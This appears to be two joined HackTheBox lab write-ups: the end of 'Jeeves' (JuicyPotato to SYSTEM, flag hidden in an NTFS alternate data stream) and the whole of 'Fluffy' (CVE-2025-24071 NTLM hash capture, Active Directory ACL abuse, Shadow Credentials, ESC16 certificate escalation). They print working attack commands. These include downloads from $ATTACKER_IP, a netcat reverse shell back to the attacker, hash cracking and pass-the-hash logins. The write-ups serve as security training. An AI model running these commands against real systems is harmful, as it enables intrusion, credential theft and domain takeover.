PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled The presence of SeImpersonatePrivilege immediately suggests several well-known privilege escalation techniques, including JuicyPotato, RoguePotato, PrintSpoofer, and GodPotato. Since the target is running Windows 10 Pro Build 10586, JuicyPotato is a viable option.
What is JuicyPotato?
JuicyPotato is a Windows privilege escalation tool that abuses COM service activation together with SeImpersonatePrivilege to obtain a SYSTEM access token. It was commonly effective on Windows Server 2008–2016 and Windows 10 builds prior to the mitigations introduced in newer releases.
Exploiting SeImpersonatePrivilege # For the exploitation, we need to transfer the compiled binaries of netcat and JuicyPotato.exe to the Windows Target. Open a python server on the attacker machine:
└─$ python3 -m http.server 8090 Download the binaries using the PowerShell cmdlet “Invoke-WebRequest” as curl and wget are not available to us:
C:\Users\kohsuke> powershell.exe -Command "Invoke-WebRequest -Uri http://$ATTACKER_IP:8090/nc.exe -OutFile nc.exe" C:\Users\kohsuke> powershell.exe -Command "Invoke-WebRequest -Uri http://$ATTACKER_IP:8090/jp.exe -OutFile jp.exe" NOTE: JuicyPotato can be downloaded from here
Open another netcat listener on our attacker machine to catch the reverse shell returned by the exploit:
└─$ rlwrap nc -lvnp 9091 Run the exploit from the directory where both binaries are present (e.g kohsuke directory in my case) :
C:\Users\kohsuke> jp.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\kohsuke\nc.exe $ATTACKER_IP 9091 -e cmd.exe" -t * Argument Description jp.exe JuicyPotato executable. -l 53375 Creates a local COM listener on port 53375 used during token impersonation. -p C:\Windows\System32\cmd.exe Program to execute after obtaining the privileged token. -a “/c …” Arguments passed to cmd.exe. The /c flag tells cmd to execute the command and then terminate. C:\Users\kohsuke\nc.exe $ATTACKER_IP 9091 -e cmd.exe Launches Netcat and sends a reverse shell to the attacker’s machine. -t * Tries both CreateProcessWithTokenW and CreateProcessAsUser methods for spawning the process. Looking back into the 2nd netcat listener terminal we got a shell with the privileges of “NT AUTHORITY\SYSTEM”:
Microsoft Windows [Version 10.0.10586] (c) 2015 Microsoft Corporation. All rights reserved. C:\Windows\system32>whoami nt authority\system Finding the root.txt in the Administrator’s desktop but we are told in the hm.txt to look deeper:
C:\Users\Administrator\Desktop>dir Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\Users\Administrator\Desktop 11/08/2017 10:05 AM <DIR> . 11/08/2017 10:05 AM <DIR> .. 12/24/2017 03:51 AM 36 hm.txt 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk C:\Users\Administrator\Desktop>type hm.txt The flag is elsewhere. Look deeper. Since the flag was not present on the desktop and the hint suggested looking deeper, hidden NTFS Alternate Data Streams became a likely place to investigate.
What are Alternate Data Streams?
Alternate Data Streams (ADS) are a feature of the NTFS filesystem that allow additional data to be attached to a file without appearing in normal directory listings. ADS are commonly used for metadata storage but can also be abused to conceal malicious files or sensitive information.
Finding Flag in ADS # Windows Explorer and a standard dir listing do not display Alternate Data Streams. The /R switch can be used to enumerate any ADS attached to a file.
C:\Users\Administrator\Desktop>dir /R Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\Users\Administrator\Desktop 11/08/2017 10:05 AM <DIR> . 11/08/2017 10:05 AM <DIR> .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 1,532,428,288 bytes free And as we saw, the root flag file is present in the ADS of hm.txt. To extract the flag file’s output:
C:\Users\Administrator\Desktop> more < "C:\Users\Administrator\Desktop\hm.txt:root.txt:$DATA" Component Description more Windows command used to display text output one page at a time. < Input redirection operator. Feeds the contents of a file into the command. hm.txt The primary file. root.txt The name of the Alternate Data Stream attached to hm.txt. $DATA The default NTFS stream type representing the stream’s data. Key Takeaways
Unauthenticated Jenkins instances should always be treated as high-priority findings due to the potential for Script Console abuse. Identifying the Windows build version can significantly influence privilege escalation decisions. SeImpersonatePrivilege remains one of the most valuable privileges for local escalation on older Windows systems. Alternate Data Streams (ADS) are easy to overlook during enumeration and can be used to conceal data from standard file listings.
summary: Explore web enumeration, Jenkins remote code execution, JuicyPotato privilege escalation, and NTFS ADS abuse on HTB Jeeves.
title: Jeeves Machine Writeup | HTB

content:
Summary # Fluffy is an easy Windows machine that simulates an assumed-breach scenario, providing initial access through the credentials of a low-privileged user. By leveraging CVE-2025–24071, it is possible to capture the credentials of another low-privileged account. Further Active Directory enumeration reveals exploitable ACL relationships involving the winrm_svc and ca_svc accounts. These permissions can be abused to gain access to the winrm_svc account and establish a WinRM session on the target. Finally, misconfigurations in Active Directory Certificate Services (AD CS), including ESC16-related conditions, can be leveraged through the ca_svc account to obtain administrative access to the domain.
Reconnaissance # Rustscan # We start with rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a $TARGET_IP -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49693/tcp open unknown syn-ack ttl 127 49694/tcp open unknown syn-ack ttl 127 49702/tcp open unknown syn-ack ttl 127 49718/tcp open unknown syn-ack ttl 127 49731/tcp open unknown syn-ack ttl 127 49766/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap $TARGET_IP -T4 -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49667,49693,49694,49702,49718,49731,49766 -Pn Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 21:10 +0500 Nmap scan report for $TARGET_IP Host is up (0.40s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-17 23:15:31Z) 135/tcp filtered msrpc 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap |_ssl-date: 2026-06-17T23:17:05+00:00; +7h04m56s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY | Not valid before: 2026-04-30T16:09:59 |_Not valid after: 2106-04-30T16:09:59 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name) |_ssl-date: 2026-06-17T23:17:05+00:00; +7h04m57s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY | Not valid before: 2026-04-30T16:09:59 |_Not valid after: 2106-04-30T16:09:59 3268/tcp open ldap |_ssl-date: 2026-06-17T23:17:05+00:00; +7h04m56s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY | Not valid before: 2026-04-30T16:09:59 |_Not valid after: 2106-04-30T16:09:59 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY | Not valid before: 2026-04-30T16:09:59 |_Not valid after: 2106-04-30T16:09:59 |_ssl-date: 2026-06-17T23:17:05+00:00; +7h04m57s from scanner time. 3389/tcp filtered ms-wbt-server 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open adws? 49667/tcp open msrpc Microsoft Windows RPC 49693/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49694/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49718/tcp open msrpc Microsoft Windows RPC 49731/tcp open msrpc Microsoft Windows RPC 49766/tcp open unknown Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2026-06-17T23:16:27 |_ start_date: N/A |_clock-skew: mean: 7h04m56s, deviation: 0s, median: 7h04m56s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required We will write the DNS entries of the Target machine in our /etc/hosts:
└─$ sudo nano /etc/hosts $TARGET_IP fluffy.htb DC01.fluffy.htb DC01 Also sync the system clock with the Domain Controller as we will later need it when performing kerberos authentication:
└─$ sudo ntpdate $TARGET_IP Initial Access # Enumeration # Using the provided credentials (j.fleischman : J0elTHEM4n1990!) from the machine description, we will first check the SMB shares available to us on the port 445 (SMB)
└─$ nxc smb $TARGET_IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares Following shares are identified:
Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share IPC$ READ Remote IPC IT READ,WRITE NETLOGON READ Logon server share SYSVOL READ Logon server share To avoid visiting and mapping all shares manually, we can spider the shares with the netexec module “spider_plus”:
└─$ nxc smb $TARGET_IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' -M spider_plus From the spider’s JSON file output, following files and folders are present in the uncommon SMB share “IT”:
Everything-1.4.1.1026.x64.zip Everything-1.4.1.1026.x64 KeePass-2.58.zip KeePass-2.58 Upgrade_Notice.pdf To download the PDF file, we can use netexec:
└─$ sudo nxc smb $TARGET_IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' --share IT --get-file Upgrade_Notice.pdf Upgrade_Notice.pdf Opening the PDF, we saw that it is mentioning Year 2025’s high severity vulnerabilities which need to be identified and patched in the AD environment by the “IT Department”
Vulnerability Discovery # After checking each CVE Id one by one on Google to find what they are about, the “CVE-2025-24071” seemed useful to us
The vulnerability can be summarized as:
CVE-2025-24071: is a critical zero-click Windows File Explorer vulnerability that leaks NTLMv2 hashes. By placing a malicious .library-ms file inside a ZIP/RAR archive, an attacker can cause Windows Explorer to automatically connect to an attacker-controlled SMB server and authenticate, exposing the victim’s NTLMv2 hash without requiring the file to be opened. As we saw zip files already present and extracted in the SMB share, it is possible that they are being extracted by some user (automatically ofcourse in this HTB lab). To make such a .library-ms file that points to our SMB server, we can look for already created POC exploits on Google. We found one such script at: GitHub:
We can download it with git:
└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git To use the exploit POC, we need to provide it the name of the file and our ip address. Here we will provide the IP of our tun0 interface created by the HTB lab’s OpenVPN:
└─$ cd CVE-2025-24071_PoC └─$ chmod +x poc.py To run the exploit, we need to have python installed in our system:
└─$ python3 poc.py A file named “exploit.zip” will be created in our current directory which we can upload to the IT share. But before uploading, we need to start an SMB Listener on our attack host. Responder is a tool that can be used in such NTLM hash stealing attacks. To start it:
└─$ sudo responder -I tun0 Now upload the file to the share with netexec:
└─$ sudo nxc smb $TARGET_IP -u 'j.fleischman' -p 'J0elTHEM4n1990!' --share IT --pu-file exploit.zip exploit.pdf As soon as the exploit.zip is extracted, we got a hit for a NTLMv2 hash in our responder tab:
As this is in hash form, we need to crack it to get the plaintext password. Save the hash in a file and we will use hashcat with the rockyou.txt wordlist with hash mode 5600:
└─$ hashcat -m 5600 p.agila-NTLMv2.hash /usr/share/wordlists/rockyou.txt The password is cracked. Now to map our AD network, we can use bloodhound. It will show us the details of AD in a clean GUI form from where it is easy to identify and plan our next attack path:
We can run the bloodhound python based collector directly from our kali machine:
└─$ bloodhound-ce-python -c all -u 'p.agila' --hashes '<P.Agila_Password>' -d 'fluffy.htb' -ns $TARGET_IP --dns-tcp --zip After the collection work is done, open the bloodhound tool and upload the collection zip:
└─$ bloodhound The user “p.agila” has indirectly “GenericAll” rights on the Active Directory group “Service Accounts”. Using the privileges, we can add ourselves or any other user we like to the respected group. Checking the “Outbound Object Control” of the “Service Accounts”, it revealed this group has “GenericWrite” on 3 users.
WINRM_SVC and CA_SVC look useful as the first one has the Group Membership of “Remote Management Users” which means if we compromise this user we can get internal access to the machine. Regarding the CA_SVC, this user is marked Diamond Shape by bloodhound automatically and confirming the group membership of this user as well, we found out that it is a member of “Cert Publishers” which is a group regarding Active Directory Certificate Services (ADCS)
To compromise both of them, we can simply click the “GenericWrite” word and bloodhound will suggest us some attack paths we can choose. But first, we need to have the membership of this group. So we will again select p.agila in bloodhound and see what attack path we have to get in the group:
Here bloodhound is suggesting us that we can modify the group membership. So we will take the path:
└─$ net rpc group addmem "SERVICE ACCOUNTS" 'j.fleischman' -U "fluffy.htb"/"p.agila"%"<P.Agila_Password>" -S "DC01.fluffy.htb" We are adding our initial user “j.fleischman” to the group so it will inherit the group privileges. After adding, we can confirm the group membership with:
└─$ net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb"/"p.agila"%"<P.Agila_Password>" -S "DC01.fluffy.htb" FLUFFY\ca_svc FLUFFY\ldap_svc FLUFFY\winrm_svc FLUFFY\j.fleischman Now going to the compromising of other two accounts:
We can add Shadow Credentials to the two accounts which will allow us to authenticate as them with the NT hash or ccache kerberos file provided as output by our next tool “bloodyad”:
# For WINRM_SVC └─$bloodyad -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d 'fluffy.htb' -i '$TARGET_IP' add shadowCredentials 'WINRM_SVC' # For CA_SVC └─$ bloodyad -u 'winrm_svc' -p ':<WINRM_SVC-NTHash>' -d 'fluffy.htb' -i '$TARGET_IP' add shadowCredentials 'CA_SVC' Foothold # With the NT hash of WINRM_SVC, we can login to the host through the WinRM port (5985):
└─$ evil-winrm -i DC01.fluffy.htb -u 'fluffy.htb\winrm_svc' -H '<WINRM_SVC-NTHash>' We will be initially dropped into the Documents folder but we can switch to Desktop where the flag will be waiting for us :)
Escalating Privileges # Now as we already found out that there is ADCS being present, we can look for the ADCS Attacks. The SpecterOps team introduced several ADCS attack techniques in their whitepaper Certified Pre-Owned, categorizing them as ESC1 – ESC8.
Certipy # The tool for enumerating and attacking ADCS vulnerabilities on linux is certipy whereas on windows we have it as certify.exe. To use the linux variant, we can download it with apt on Debain based systems as:
└─$ sudo apt update && sudo apt install certipy-ad -y To enumerate the vulnerabilities, we can use the -vulnerable flag in the tool’s command:
└─$ certipy find -u ca_svc@fluffy.htb -hashes ':<CA_SVC-NTHash>' -target $TARGET_IP -vulnerable -stdout Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 14 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP [*] Successfully retrieved CA configuration for 'fluffy-DC01-CA' [*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 3150FA7E60CE28AD4DAE41A1B61D8874 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:12:16+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Disabled Extensions : 1.3.6.1.4.1.311.25.2 Permissions Owner : FLUFFY.HTB\Administrators Access Rights ManageCa : FLUFFY.HTB\Domain Admins FLUFFY.HTB\Enterprise Admins FLUFFY.HTB\Administrators ManageCertificates : FLUFFY.HTB\Domain Admins FLUFFY.HTB\Enterprise Admins FLUFFY.HTB\Administrators Enroll : FLUFFY.HTB\Cert Publishers FLUFFY.HTB\Administrators Read : FLUFFY.HTB\Administrators [!] Vulnerabilities ESC16 : Security Extension is disabled. [*] Remarks ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details. Certificate Templates : [!] Could not find any certificate templates The tool didn’t found any vulnerable templates in ADCS but marked the ADCS itself as being vulnerable to ESC16 attack. We can search on Google what ESC16 is and how we can perform the attack.
Reviewing the SpecterOps documentation:
Search on google we found the website of SpecterOPS:
On the bottom of the page, there is a note:
So we can first refer to ESC9 for exploitation techniques. The vulnerability criteria section describes what should be present for the exploitation to succeed. It can be summarized as:
ESC9 Requirements:
Strong certificate mapping is not fully enforced
StrongCertificateBindingEnforcement ≠ 2, or CertificateMappingMethods includes the UPN mapping flag (0x4). The certificate template has:
CT_FLAG_NO_SECURITY_EXTENSION enabled. The certificate template allows:
Client Authentication. The attacker has:
GenericWrite (or equivalent control) over any user account (A), which can then be leveraged to impersonate another user (B) via certificate abuse. ESC9 Exploitation # The User template satisfies the client authentication requirement, the CA is vulnerable to ESC16, and our control over CA_SVC through GenericWrite satisfies the required account-control condition.
As all of the required conditions are met, we can proceed with the privilege escalation. To obtain a certificate for the Administrator account, we can change the UPN of CA_SVC to Administrator, request a certificate using the credentials of CA_SVC, and then revert the UPN to its original value. Since the certificate is issued while the UPN is set to Administrator, it will be mapped to the Administrator account. We can then use the issued certificate to authenticate as Administrator and retrieve the corresponding NT hash.
As these checks are all marked true, we can successfully privilege escalate. To get the certificate as the Administrator user, we can change the UPN of CA_SVC to Administrator, request the certificate using the credentials of CA_SVC and because the UPN points to Administrator, we will be returned certificate for Administrator. Then we can revert the UPN back to original and get the authentication ticket and the NT hash using the issued certificate.
To change the UPN of CA_SVC to Administrator:
└─$ certipy account update -u winrm_svc@fluffy.htb -hashes ':<WINRM_SVC-NTHash>' -user ca_svc -upn Administrator@fluffy.htb -target $TARGET_IP Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Updating user 'ca_svc': userPrincipalName : Administrator@fluffy.htb [*] Successfully updated 'ca_svc' After this, we need to request the certificate using CA_SVC credentials:
└─$ certipy req -u 'ca_svc@fluffy.htb' -hashes ':<CA_SVC-NTHash>' -ca fluffy-DC01-CA -template User -target $TARGET_IP Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB. [!] Use -debug to print a stacktrace [*] Requesting certificate via RPC [*] Request ID is 24 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator@fluffy.htb' [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' Now revert back the UPN to original:
└─$ certipy account update -u winrm_svc@fluffy.htb -hashes ':<WINRM_SVC-NTHash>' -user ca_svc -upn ca_svc@fluffy.htb -target $TARGET_IP Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Updating user 'ca_svc': userPrincipalName : ca_svc@fluffy.htb [*] Successfully updated 'ca_svc' Now finally to get the authentication ticket and NT Hash as Administrator:
└─$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip $TARGET_IP Authenticating as Administrator # We can use either the hash or the ccache ticket file with winrm to get access as Administrator:
└─$ evil-winrm -i $TARGET_IP -u 'fluffy.htb\Administrator' -H '<Administrator-Hash>' Again the root.txt will be available in Desktop of Administrator
Fluffy provided an excellent introduction to modern Active Directory attack paths, combining NTLM hash capture, ACL abuse, Shadow Credentials, and AD CS misconfigurations to achieve full domain compromise.
summary: A walkthrough of Fluffy, featuring CVE-2025–24071, Shadow Credentials, and certificate-based privilege escalation.
